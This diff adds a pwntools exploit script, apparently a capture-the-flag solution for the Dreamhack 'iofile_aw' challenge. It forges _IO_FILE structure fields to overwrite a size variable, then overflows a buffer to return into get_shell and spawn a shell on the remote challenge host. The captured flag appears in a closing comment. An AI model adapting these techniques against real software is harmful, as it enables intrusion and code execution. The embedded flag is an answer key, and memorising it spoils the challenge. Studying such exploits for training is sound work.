@@ -1,0 +1,37 @@
+from pwn import *
+
+e = ELF("./iofile_aw_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+script = '''
+b *main
+b *main + 107
+b *read_str + 24
+'''
+
+p = remote("host1.dreamhack.games", 13756)
+#p = gdb.debug("./iofile_aw_patched", gdbscript = script)
+
+# _IO_FILE -> size address
+size = e.symbols['size']
+payload = b"printf "
+payload += p64(0x00000000fbad208b) # flag
+payload += p64(size) * 7 # _IO_FILE_
+p.sendafter(b"# ", payload)
+
+# *size = 0x0a414141
+payload = b"read"
+payload = payload.ljust(0x200, b"\x00")
+p.sendafter(b"#", payload)
+p.sendline(b"AAA")
+
+# ret2win
+win = e.symbols['get_shell']
+payload = b"exit"
+payload = payload.ljust(0x220, b"\x00")
+payload += p64(0) + p64(win)
+p.sendafter(b"#", payload)
+
+p.interactive()
+#DH{2e862835c1695aff894bc9149af81d4939ef72ba10abad7b91a9959967894c89}
